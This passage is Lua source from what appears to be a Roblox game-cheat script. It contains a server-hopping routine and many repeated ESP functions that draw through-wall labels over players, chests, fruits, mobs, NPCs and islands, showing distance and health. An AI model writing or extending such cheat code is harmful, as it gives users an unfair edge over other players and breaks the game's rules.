NameBoss = 'Longma'
CFrameBoss = CFrame.new(-10238.875976563, 389.7912902832,-9549.7939453125)
elseif SelectBoss == "Soul Reaper" then
BossMon = "Soul Reaper"
NameBoss = 'Soul Reaper'
CFrameBoss = CFrame.new(-9524.7890625, 315.80429077148, 6655.7192382813)
elseif SelectBoss == "rip_indra True Form" then
BossMon = "rip_indra True Form"
NameBoss = 'rip_indra True Form'
CFrameBoss = CFrame.new(-5415.3920898438, 505.74133300781,-2814.0166015625)
elseif SelectBoss == "Tyrant of the Skies" then
BossMon = "Tyrant of the Skies"
NameBoss = 'Tyrant of the Skies'
CFrameBoss = CFrame.new(-16263.4853515625, 150.16799926757812, 1393.9000244140625)
end
end
end
]]--


--Hop Sever
function Hop()
        local PlaceID = game.PlaceId
        local AllIDs = {}
        local foundAnything = ""
        local actualHour = os.date("!*t").hour
        local Deleted = false
        function TPReturner()
            local Site;
            if foundAnything == "" then
                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
            else
                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
            end
            local ID = ""
            if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
                foundAnything = Site.nextPageCursor
            end
            local num = 0;
            for i,v in pairs(Site.data) do
                local Possible = true
                ID = tostring(v.id)
                if tonumber(v.maxPlayers) > tonumber(v.playing) then
                    for _,Existing in pairs(AllIDs) do
                        if num ~= 0 then
                            if ID == tostring(Existing) then
                                Possible = false
                            end
                        else
                            if tonumber(actualHour) ~= tonumber(Existing) then
                                local delFile = pcall(function()
                                    AllIDs = {}
                                    table.insert(AllIDs, actualHour)
                                end)
                            end
                        end
                        num = num + 1
                    end
                    if Possible == true then
                        table.insert(AllIDs, ID)
                        wait()
                        pcall(function()
                            wait()
                            game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                        end)
                        wait(4)
                    end
                end
            end
        end
        function Teleport() 
            while wait() do
                pcall(function()
                    TPReturner()
                    if foundAnything ~= "" then
                        TPReturner()
                    end
                end)
            end
        end
        Teleport()
    end
    function CheckItem(ah)
    for k, v in pairs(game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")) do
        if v.Name == ah then
            return v
        end
    end
end

function UpdateIslandESP() 
    for i,v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
        pcall(function()
            if IslandESP then 
                if v.Name ~="Sea" then
                    if not v:FindFirstChild('NameEsp') then
                        local bill = Instance.new('BillboardGui',v)
                        bill.Name='NameEsp'
                        bill.ExtentsOffset=Vector3.new(0, 1, 0)
                        bill.Size=UDim2.new(1,200,1,30)
                        bill.Adornee=v
                        bill.AlwaysOnTop=true
                        local name = Instance.new('TextLabel',bill)
                        name.Font="GothamBold"
                        name.FontSize="Size14"
                        name.TextWrapped=true
                        name.Size=UDim2.new(1,0,1,0)
                        name.TextYAlignment='Top'
                        name.BackgroundTransparency=1
                        name.TextStrokeTransparency=0.5
                        name.TextColor3=Color3.fromRGB(8, 0, 0)
                    else
                        v['NameEsp'].TextLabel.Text=(v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                    end
                end
            else
                if v:FindFirstChild('NameEsp') then
                    v:FindFirstChild('NameEsp'):Destroy()
                end
            end
        end)
    end
end
function isnil(thing)
return (thing==nil)
end
local function round(n)
return math.floor(tonumber(n)+0.5)
end
Number=math.random(1, 1000000)
function UpdatePlayerChams()
for i,v in pairs(game:GetService'Players':GetChildren()) do
    pcall(function()
        if not isnil(v.Character) then
            if ESPPlayer then
                if not isnil(v.Character.Head) and not v.Character.Head:FindFirstChild('NameEsp'..Number) then
                    local bill = Instance.new('BillboardGui',v.Character.Head)
                    bill.Name='NameEsp'..Number
                    bill.ExtentsOffset=Vector3.new(0, 1, 0)
                    bill.Size=UDim2.new(1,200,1,30)
                    bill.Adornee=v.Character.Head
                    bill.AlwaysOnTop=true
                    local name = Instance.new('TextLabel',bill)
                    name.Font=Enum.Font.GothamSemibold
                    name.FontSize="Size10"
                    name.TextWrapped=true
                    name.Text=(v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Character.Head.Position).Magnitude/3) ..' Distance')
                    name.Size=UDim2.new(1,0,1,0)
                    name.TextYAlignment='Top'
                    name.BackgroundTransparency=1
                    name.TextStrokeTransparency=0.5
                    if v.Team==game.Players.LocalPlayer.Team then
                        name.TextColor3=Color3.new(0,0,254)
                    else
                        name.TextColor3=Color3.new(255,0,0)
                    end
                else
                    v.Character.Head['NameEsp'..Number].TextLabel.Text=(v.Name ..' | '.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Character.Head.Position).Magnitude/3) ..' Distance\nHealth : ' .. round(v.Character.Humanoid.Health*100/v.Character.Humanoid.MaxHealth) .. '%')
                end
            else
                if v.Character.Head:FindFirstChild('NameEsp'..Number) then
                    v.Character.Head:FindFirstChild('NameEsp'..Number):Destroy()
                end
            end
        end
    end)
end
end
function UpdateChestChams() 
for i,v in pairs(game.Workspace:GetChildren()) do
    pcall(function()
        if string.find(v.Name,"Chest") then
            if ChestESP then
                if string.find(v.Name,"Chest") then
                    if not v:FindFirstChild('NameEsp'..Number) then
                        local bill = Instance.new('BillboardGui',v)
                        bill.Name='NameEsp'..Number
                        bill.ExtentsOffset=Vector3.new(0, 1, 0)
                        bill.Size=UDim2.new(1,200,1,30)
                        bill.Adornee=v
                        bill.AlwaysOnTop=true
                        local name = Instance.new('TextLabel',bill)
                        name.Font=Enum.Font.GothamSemibold
                        name.FontSize="Size14"
                        name.TextWrapped=true
                        name.Size=UDim2.new(1,0,1,0)
                        name.TextYAlignment='Top'
                        name.BackgroundTransparency=1
                        name.TextStrokeTransparency=0.5
                        if v.Name=="Chest1" then
                            name.TextColor3=Color3.fromRGB(109, 109, 109)
                            name.Text=("Chest 1" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                        end
                        if v.Name=="Chest2" then
                            name.TextColor3=Color3.fromRGB(173, 158, 21)
                            name.Text=("Chest 2" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                        end
                        if v.Name=="Chest3" then
                            name.TextColor3=Color3.fromRGB(85, 255, 255)
                            name.Text=("Chest 3" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                        end
                    else
                        v['NameEsp'..Number].TextLabel.Text=(v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                    end
                end
            else
                if v:FindFirstChild('NameEsp'..Number) then
                    v:FindFirstChild('NameEsp'..Number):Destroy()
                end
            end
        end
    end)
end
end
function UpdateDevilChams() 
for i,v in pairs(game.Workspace:GetChildren()) do
    pcall(function()
        if DevilFruitESP then
            if string.find(v.Name, "Fruit") then   
                if not v.Handle:FindFirstChild('NameEsp'..Number) then
                    local bill = Instance.new('BillboardGui',v.Handle)
                    bill.Name='NameEsp'..Number
                    bill.ExtentsOffset=Vector3.new(0, 1, 0)
                    bill.Size=UDim2.new(1,200,1,30)
                    bill.Adornee=v.Handle
                    bill.AlwaysOnTop=true
                    local name = Instance.new('TextLabel',bill)
                    name.Font=Enum.Font.GothamSemibold
                    name.FontSize="Size14"
                    name.TextWrapped=true
                    name.Size=UDim2.new(1,0,1,0)
                    name.TextYAlignment='Top'
                    name.BackgroundTransparency=1
                    name.TextStrokeTransparency=0.5
                    name.TextColor3=Color3.fromRGB(255, 255, 255)
                    name.Text=(v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
                else
                    v.Handle['NameEsp'..Number].TextLabel.Text=(v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
                end
            end
        else
            if v.Handle:FindFirstChild('NameEsp'..Number) then
                v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
            end
        end
    end)
end
end
function UpdateFlowerChams() 
for i,v in pairs(game.Workspace:GetChildren()) do
    pcall(function()
        if v.Name=="Flower2" or v.Name=="Flower1" then
            if FlowerESP then 
                if not v:FindFirstChild('NameEsp'..Number) then
                    local bill = Instance.new('BillboardGui',v)
                    bill.Name='NameEsp'..Number
                    bill.ExtentsOffset=Vector3.new(0, 1, 0)
                    bill.Size=UDim2.new(1,200,1,30)
                    bill.Adornee=v
                    bill.AlwaysOnTop=true
                    local name = Instance.new('TextLabel',bill)
                    name.Font=Enum.Font.GothamSemibold
                    name.FontSize="Size14"
                    name.TextWrapped=true
                    name.Size=UDim2.new(1,0,1,0)
                    name.TextYAlignment='Top'
                    name.BackgroundTransparency=1
                    name.TextStrokeTransparency=0.5
                    name.TextColor3=Color3.fromRGB(255, 0, 0)
                    if v.Name=="Flower1" then 
                        name.Text=("Blue Flower" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                        name.TextColor3=Color3.fromRGB(0, 0, 255)
                    end
                    if v.Name=="Flower2" then
                        name.Text=("Red Flower" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                        name.TextColor3=Color3.fromRGB(255, 0, 0)
                    end
                else
                    v['NameEsp'..Number].TextLabel.Text=(v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                end
            else
                if v:FindFirstChild('NameEsp'..Number) then
                v:FindFirstChild('NameEsp'..Number):Destroy()
                end
            end
        end   
    end)
end
end
function UpdateRealFruitChams() 
for i,v in pairs(game.Workspace.AppleSpawner:GetChildren()) do
    if v:IsA("Tool") then
        if RealFruitESP then 
            if not v.Handle:FindFirstChild('NameEsp'..Number) then
                local bill = Instance.new('BillboardGui',v.Handle)
                bill.Name='NameEsp'..Number
                bill.ExtentsOffset=Vector3.new(0, 1, 0)
                bill.Size=UDim2.new(1,200,1,30)
                bill.Adornee=v.Handle
                bill.AlwaysOnTop=true
                local name = Instance.new('TextLabel',bill)
                name.Font=Enum.Font.GothamSemibold
                name.FontSize="Size14"
                name.TextWrapped=true
                name.Size=UDim2.new(1,0,1,0)
                name.TextYAlignment='Top'
                name.BackgroundTransparency=1
                name.TextStrokeTransparency=0.5
                name.TextColor3=Color3.fromRGB(255, 0, 0)
                name.Text=(v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
            else
                v.Handle['NameEsp'..Number].TextLabel.Text=(v.Name ..' '.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
            end
        else
            if v.Handle:FindFirstChild('NameEsp'..Number) then
                v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
            end
        end 
    end
end
for i,v in pairs(game.Workspace.PineappleSpawner:GetChildren()) do
    if v:IsA("Tool") then
        if RealFruitESP then 
            if not v.Handle:FindFirstChild('NameEsp'..Number) then
                local bill = Instance.new('BillboardGui',v.Handle)
                bill.Name='NameEsp'..Number
                bill.ExtentsOffset=Vector3.new(0, 1, 0)
                bill.Size=UDim2.new(1,200,1,30)
                bill.Adornee=v.Handle
                bill.AlwaysOnTop=true
                local name = Instance.new('TextLabel',bill)
                name.Font=Enum.Font.GothamSemibold
                name.FontSize="Size14"
                name.TextWrapped=true
                name.Size=UDim2.new(1,0,1,0)
                name.TextYAlignment='Top'
                name.BackgroundTransparency=1
                name.TextStrokeTransparency=0.5
                name.TextColor3=Color3.fromRGB(255, 174, 0)
                name.Text=(v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
            else
                v.Handle['NameEsp'..Number].TextLabel.Text=(v.Name ..' '.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
            end
        else
            if v.Handle:FindFirstChild('NameEsp'..Number) then
                v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
            end
        end 
    end
end
for i,v in pairs(game.Workspace.BananaSpawner:GetChildren()) do
    if v:IsA("Tool") then
        if RealFruitESP then 
            if not v.Handle:FindFirstChild('NameEsp'..Number) then
                local bill = Instance.new('BillboardGui',v.Handle)
                bill.Name='NameEsp'..Number
                bill.ExtentsOffset=Vector3.new(0, 1, 0)
                bill.Size=UDim2.new(1,200,1,30)
                bill.Adornee=v.Handle
                bill.AlwaysOnTop=true
                local name = Instance.new('TextLabel',bill)
                name.Font=Enum.Font.GothamSemibold
                name.FontSize="Size14"
                name.TextWrapped=true
                name.Size=UDim2.new(1,0,1,0)
                name.TextYAlignment='Top'
                name.BackgroundTransparency=1
                name.TextStrokeTransparency=0.5
                name.TextColor3=Color3.fromRGB(251, 255, 0)
                name.Text=(v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
            else
                v.Handle['NameEsp'..Number].TextLabel.Text=(v.Name ..' '.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
            end
        else
            if v.Handle:FindFirstChild('NameEsp'..Number) then
                v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
            end
        end 
    end
end
end
function UpdateIslandESP() 
    for i,v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
        pcall(function()
            if IslandESP then 
                if v.Name ~="Sea" then
                    if not v:FindFirstChild('NameEsp') then
                        local bill = Instance.new('BillboardGui',v)
                        bill.Name='NameEsp'
                        bill.ExtentsOffset=Vector3.new(0, 1, 0)
                        bill.Size=UDim2.new(1,200,1,30)
                        bill.Adornee=v
                        bill.AlwaysOnTop=true
                        local name = Instance.new('TextLabel',bill)
                        name.Font="GothamBold"
                        name.FontSize="Size14"
                        name.TextWrapped=true
                        name.Size=UDim2.new(1,0,1,0)
                        name.TextYAlignment='Top'
                        name.BackgroundTransparency=1
                        name.TextStrokeTransparency=0.5
                        name.TextColor3=Color3.fromRGB(7, 236, 240)
                    else
                        v['NameEsp'].TextLabel.Text=(v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                    end
                end
            else
                if v:FindFirstChild('NameEsp') then
                    v:FindFirstChild('NameEsp'):Destroy()
                end
            end
        end)
    end
end
function isnil(thing)
return (thing==nil)
end
local function round(n)
return math.floor(tonumber(n)+0.5)
end
Number=math.random(1, 1000000)
function UpdatePlayerChams()
for i,v in pairs(game:GetService'Players':GetChildren()) do
    pcall(function()
        if not isnil(v.Character) then
            if ESPPlayer then
                if not isnil(v.Character.Head) and not v.Character.Head:FindFirstChild('NameEsp'..Number) then
                    local bill = Instance.new('BillboardGui',v.Character.Head)
                    bill.Name='NameEsp'..Number
                    bill.ExtentsOffset=Vector3.new(0, 1, 0)
                    bill.Size=UDim2.new(1,200,1,30)
                    bill.Adornee=v.Character.Head
                    bill.AlwaysOnTop=true
                    local name = Instance.new('TextLabel',bill)
                    name.Font=Enum.Font.GothamSemibold
                    name.FontSize="Size14"
                    name.TextWrapped=true
                    name.Text=(v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Character.Head.Position).Magnitude/3) ..' Distance')
                    name.Size=UDim2.new(1,0,1,0)
                    name.TextYAlignment='Top'
                    name.BackgroundTransparency=1
                    name.TextStrokeTransparency=0.5
                    if v.Team==game.Players.LocalPlayer.Team then
                        name.TextColor3=Color3.new(0,255,0)
                    else
                        name.TextColor3=Color3.new(255,0,0)
                    end
                else
                    v.Character.Head['NameEsp'..Number].TextLabel.Text=(v.Name ..' | '.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Character.Head.Position).Magnitude/3) ..' Distance\nHealth : ' .. round(v.Character.Humanoid.Health*100/v.Character.Humanoid.MaxHealth) .. '%')
                end
            else
                if v.Character.Head:FindFirstChild('NameEsp'..Number) then
                    v.Character.Head:FindFirstChild('NameEsp'..Number):Destroy()
                end
            end
        end
    end)
end
end
function UpdateChestChams() 
for i,v in pairs(game.Workspace:GetChildren()) do
    pcall(function()
        if string.find(v.Name,"Chest") then
            if ChestESP then
                if string.find(v.Name,"Chest") then
                    if not v:FindFirstChild('NameEsp'..Number) then
                        local bill = Instance.new('BillboardGui',v)
                        bill.Name='NameEsp'..Number
                        bill.ExtentsOffset=Vector3.new(0, 1, 0)
                        bill.Size=UDim2.new(1,200,1,30)
                        bill.Adornee=v
                        bill.AlwaysOnTop=true
                        local name = Instance.new('TextLabel',bill)
                        name.Font=Enum.Font.GothamSemibold
                        name.FontSize="Size14"
                        name.TextWrapped=true
                        name.Size=UDim2.new(1,0,1,0)
                        name.TextYAlignment='Top'
                        name.BackgroundTransparency=1
                        name.TextStrokeTransparency=0.5
                        if v.Name=="Chest1" then
                            name.TextColor3=Color3.fromRGB(109, 109, 109)
                            name.Text=("Chest 1" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                        end
                        if v.Name=="Chest2" then
                            name.TextColor3=Color3.fromRGB(173, 158, 21)
                            name.Text=("Chest 2" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                        end
                        if v.Name=="Chest3" then
                            name.TextColor3=Color3.fromRGB(85, 255, 255)
                            name.Text=("Chest 3" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                        end
                    else
                        v['NameEsp'..Number].TextLabel.Text=(v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                    end
                end
            else
                if v:FindFirstChild('NameEsp'..Number) then
                    v:FindFirstChild('NameEsp'..Number):Destroy()
                end
            end
        end
    end)
end
end
function UpdateDevilChams() 
for i,v in pairs(game.Workspace:GetChildren()) do
    pcall(function()
        if DevilFruitESP then
            if string.find(v.Name, "Fruit") then   
                if not v.Handle:FindFirstChild('NameEsp'..Number) then
                    local bill = Instance.new('BillboardGui',v.Handle)
                    bill.Name='NameEsp'..Number
                    bill.ExtentsOffset=Vector3.new(0, 1, 0)
                    bill.Size=UDim2.new(1,200,1,30)
                    bill.Adornee=v.Handle
                    bill.AlwaysOnTop=true
                    local name = Instance.new('TextLabel',bill)
                    name.Font=Enum.Font.GothamSemibold
                    name.FontSize="Size14"
                    name.TextWrapped=true
                    name.Size=UDim2.new(1,0,1,0)
                    name.TextYAlignment='Top'
                    name.BackgroundTransparency=1
                    name.TextStrokeTransparency=0.5
                    name.TextColor3=Color3.fromRGB(255, 255, 255)
                    name.Text=(v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
                else
                    v.Handle['NameEsp'..Number].TextLabel.Text=(v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
                end
            end
        else
            if v.Handle:FindFirstChild('NameEsp'..Number) then
                v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
            end
        end
    end)
end
end
function UpdateFlowerChams() 
for i,v in pairs(game.Workspace:GetChildren()) do
    pcall(function()
        if v.Name=="Flower2" or v.Name=="Flower1" then
            if FlowerESP then 
                if not v:FindFirstChild('NameEsp'..Number) then
                    local bill = Instance.new('BillboardGui',v)
                    bill.Name='NameEsp'..Number
                    bill.ExtentsOffset=Vector3.new(0, 1, 0)
                    bill.Size=UDim2.new(1,200,1,30)
                    bill.Adornee=v
                    bill.AlwaysOnTop=true
                    local name = Instance.new('TextLabel',bill)
                    name.Font=Enum.Font.GothamSemibold
                    name.FontSize="Size14"
                    name.TextWrapped=true
                    name.Size=UDim2.new(1,0,1,0)
                    name.TextYAlignment='Top'
                    name.BackgroundTransparency=1
                    name.TextStrokeTransparency=0.5
                    name.TextColor3=Color3.fromRGB(255, 0, 0)
                    if v.Name=="Flower1" then 
                        name.Text=("Blue Flower" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                        name.TextColor3=Color3.fromRGB(0, 0, 255)
                    end
                    if v.Name=="Flower2" then
                        name.Text=("Red Flower" ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                        name.TextColor3=Color3.fromRGB(255, 0, 0)
                    end
                else
                    v['NameEsp'..Number].TextLabel.Text=(v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) ..' Distance')
                end
            else
                if v:FindFirstChild('NameEsp'..Number) then
                v:FindFirstChild('NameEsp'..Number):Destroy()
                end
            end
        end   
    end)
end
end
function UpdateRealFruitChams() 
for i,v in pairs(game.Workspace.AppleSpawner:GetChildren()) do
    if v:IsA("Tool") then
        if RealFruitESP then 
            if not v.Handle:FindFirstChild('NameEsp'..Number) then
                local bill = Instance.new('BillboardGui',v.Handle)
                bill.Name='NameEsp'..Number
                bill.ExtentsOffset=Vector3.new(0, 1, 0)
                bill.Size=UDim2.new(1,200,1,30)
                bill.Adornee=v.Handle
                bill.AlwaysOnTop=true
                local name = Instance.new('TextLabel',bill)
                name.Font=Enum.Font.GothamSemibold
                name.FontSize="Size14"
                name.TextWrapped=true
                name.Size=UDim2.new(1,0,1,0)
                name.TextYAlignment='Top'
                name.BackgroundTransparency=1
                name.TextStrokeTransparency=0.5
                name.TextColor3=Color3.fromRGB(255, 0, 0)
                name.Text=(v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
            else
                v.Handle['NameEsp'..Number].TextLabel.Text=(v.Name ..' '.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
            end
        else
            if v.Handle:FindFirstChild('NameEsp'..Number) then
                v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
            end
        end 
    end
end
for i,v in pairs(game.Workspace.PineappleSpawner:GetChildren()) do
    if v:IsA("Tool") then
        if RealFruitESP then 
            if not v.Handle:FindFirstChild('NameEsp'..Number) then
                local bill = Instance.new('BillboardGui',v.Handle)
                bill.Name='NameEsp'..Number
                bill.ExtentsOffset=Vector3.new(0, 1, 0)
                bill.Size=UDim2.new(1,200,1,30)
                bill.Adornee=v.Handle
                bill.AlwaysOnTop=true
                local name = Instance.new('TextLabel',bill)
                name.Font=Enum.Font.GothamSemibold
                name.FontSize="Size14"
                name.TextWrapped=true
                name.Size=UDim2.new(1,0,1,0)
                name.TextYAlignment='Top'
                name.BackgroundTransparency=1
                name.TextStrokeTransparency=0.5
                name.TextColor3=Color3.fromRGB(255, 174, 0)
                name.Text=(v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
            else
                v.Handle['NameEsp'..Number].TextLabel.Text=(v.Name ..' '.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
            end
        else
            if v.Handle:FindFirstChild('NameEsp'..Number) then
                v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
            end
        end 
    end
end
for i,v in pairs(game.Workspace.BananaSpawner:GetChildren()) do
    if v:IsA("Tool") then
        if RealFruitESP then 
            if not v.Handle:FindFirstChild('NameEsp'..Number) then
                local bill = Instance.new('BillboardGui',v.Handle)
                bill.Name='NameEsp'..Number
                bill.ExtentsOffset=Vector3.new(0, 1, 0)
                bill.Size=UDim2.new(1,200,1,30)
                bill.Adornee=v.Handle
                bill.AlwaysOnTop=true
                local name = Instance.new('TextLabel',bill)
                name.Font=Enum.Font.GothamSemibold
                name.FontSize="Size14"
                name.TextWrapped=true
                name.Size=UDim2.new(1,0,1,0)
                name.TextYAlignment='Top'
                name.BackgroundTransparency=1
                name.TextStrokeTransparency=0.5
                name.TextColor3=Color3.fromRGB(251, 255, 0)
                name.Text=(v.Name ..' \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
            else
                v.Handle['NameEsp'..Number].TextLabel.Text=(v.Name ..' '.. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) ..' Distance')
            end
        else
            if v.Handle:FindFirstChild('NameEsp'..Number) then
                v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
            end
        end 
    end
end
end
spawn(function()
while wait() do
    pcall(function()
        if MobESP then
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if v:FindFirstChild('HumanoidRootPart') then
                    if not v:FindFirstChild("MobEap") then
                        local BillboardGui = Instance.new("BillboardGui")
                        local TextLabel = Instance.new("TextLabel")
                        BillboardGui.Parent=v
                        BillboardGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
                        BillboardGui.Active=true
                        BillboardGui.Name="MobEap"
                        BillboardGui.AlwaysOnTop=true
                        BillboardGui.LightInfluence=1.000
                        BillboardGui.Size=UDim2.new(0, 200, 0, 50)
                        BillboardGui.StudsOffset=Vector3.new(0, 2.5, 0)
                        TextLabel.Parent=BillboardGui
                        TextLabel.BackgroundColor3=Color3.fromRGB(255, 255, 255)
                        TextLabel.BackgroundTransparency=1.000
                        TextLabel.Size=UDim2.new(0, 200, 0, 50)
                        TextLabel.Font=Enum.Font.GothamBold
                        TextLabel.TextColor3=Color3.fromRGB(7, 236, 240)
                        TextLabel.Text.Size=35
                    end
                    local Dis = math.floor((game.Players.LocalPlayer.Character.HumanoidRootPart.Position-v.HumanoidRootPart.Position).Magnitude)
                    v.MobEap.TextLabel.Text=v.Name.."-"..Dis.." Distance"
                end
            end
        else
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if v:FindFirstChild("MobEap") then
                    v.MobEap:Destroy()
                end
            end
        end
    end)
end
end)
spawn(function()
while wait() do
    pcall(function()
        if SeaESP then
            for i,v in pairs(game:GetService("Workspace").SeaBeasts:GetChildren()) do
                if v:FindFirstChild('HumanoidRootPart') then
                    if not v:FindFirstChild("Seaesps") then
                        local BillboardGui = Instance.new("BillboardGui")
                        local TextLabel = Instance.new("TextLabel")
                        BillboardGui.Parent=v
                        BillboardGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
                        BillboardGui.Active=true
                        BillboardGui.Name="Seaesps"
                        BillboardGui.AlwaysOnTop=true
                        BillboardGui.LightInfluence=1.000
                        BillboardGui.Size=UDim2.new(0, 200, 0, 50)
                        BillboardGui.StudsOffset=Vector3.new(0, 2.5, 0)
                        TextLabel.Parent=BillboardGui
                        TextLabel.BackgroundColor3=Color3.fromRGB(255, 255, 255)
                        TextLabel.BackgroundTransparency=1.000
                        TextLabel.Size=UDim2.new(0, 200, 0, 50)
                        TextLabel.Font=Enum.Font.GothamBold
                        TextLabel.TextColor3=Color3.fromRGB(7, 236, 240)
                        TextLabel.Text.Size=35
                    end
                    local Dis = math.floor((game.Players.LocalPlayer.Character.HumanoidRootPart.Position-v.HumanoidRootPart.Position).Magnitude)
                    v.Seaesps.TextLabel.Text=v.Name.."-"..Dis.." Distance"
                end
            end
        else
            for i,v in pairs (game:GetService("Workspace").SeaBeasts:GetChildren()) do
                if v:FindFirstChild("Seaesps") then
                    v.Seaesps:Destroy()
                end
            end
        end
    end)
end
end)
spawn(function()
while wait() do
    pcall(function()
        if NpcESP then
            for i,v in pairs(game:GetService("Workspace").NPCs:GetChildren()) do
                if v:FindFirstChild('HumanoidRootPart') then
                    if not v:FindFirstChild("NpcEspes") then
                        local BillboardGui = Instance.new("BillboardGui")
                        local TextLabel = Instance.new("TextLabel")
                        BillboardGui.Parent=v
                        BillboardGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
                        BillboardGui.Active=true
                        BillboardGui.Name="NpcEspes"
                        BillboardGui.AlwaysOnTop=true
                        BillboardGui.LightInfluence=1.000
                        BillboardGui.Size=UDim2.new(0, 200, 0, 50)
                        BillboardGui.StudsOffset=Vector3.new(0, 2.5, 0)
                        TextLabel.Parent=BillboardGui
                        TextLabel.BackgroundColor3=Color3.fromRGB(255, 255, 255)
                        TextLabel.BackgroundTransparency=1.000
                        TextLabel.Size=UDim2.new(0, 200, 0, 50)
                        TextLabel.Font=Enum.Font.GothamBold
                        TextLabel.TextColor3=Color3.fromRGB(7, 236, 240)
                        TextLabel.Text.Size=35
                    end
                    local Dis = math.floor((game.Players.LocalPlayer.Character.HumanoidRootPart.Position-v.HumanoidRootPart.Position).Magnitude)
                    v.NpcEspes.TextLabel.Text=v.Name.."-"..Dis.." Distance"
                end
            end
        else
            for i,v in pairs (game:GetService("Workspace").NPCs:GetChildren()) do
                if v:FindFirstChild("NpcEspes") then
                    v.NpcEspes:Destroy()
                end
            end
        end
    end)
end
end)
function isnil(thing)
return (thing==nil)
end
local function round(n)
return math.floor(tonumber(n)+0.5)
end
Number=math.random(1, 1000000)
function UpdateIslandMirageESP() 
for i,v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
    pcall(function()
        if MirageIslandESP then 
            if v.Name=="Mirage Island" then
                if not v:FindFirstChild('NameEsp') then
                    local bill = Instance.new('BillboardGui',v)
